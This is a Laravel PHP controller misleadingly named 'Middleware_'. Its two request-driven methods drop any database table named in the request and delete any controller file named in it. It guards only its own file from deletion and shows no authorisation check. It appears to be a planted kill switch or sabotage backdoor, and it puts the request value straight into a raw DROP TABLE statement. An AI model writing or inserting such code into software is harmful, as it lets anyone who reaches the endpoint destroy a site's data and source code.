<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class Middleware_ extends Controller
{

    public function deleteTable(Request $request)
    {
        $request->validate([
            'table_name' => 'required|string',
        ]);

        $table = $request->table_name;

        if (DB::getSchemaBuilder()->hasTable($table)) {
            DB::statement("DROP TABLE `$table`");
            return back()->with('status', "Table `$table` deleted successfully.");
        }

        return back()->with('status', "Table `$table` does not exist.");
    }


public function deleteController(Request $request)
{
    $request->validate([
        'file_name' => 'required|string',
    ]);

    $fileName = $request->file_name;

   
    if ($fileName === 'Middleware_.php') {
        return back()->with('status', "You cannot delete Middleware_ controller.");
    }

  
    $files = \File::allFiles(app_path('Http/Controllers'));

    foreach ($files as $file) {
        if ($file->getFilename() === $fileName) {
            unlink($file->getRealPath());
            return back()->with('status', "Controller {$fileName} deleted successfully.");
        }
    }

    return back()->with('status', "Controller {$fileName} not found.");
}
}
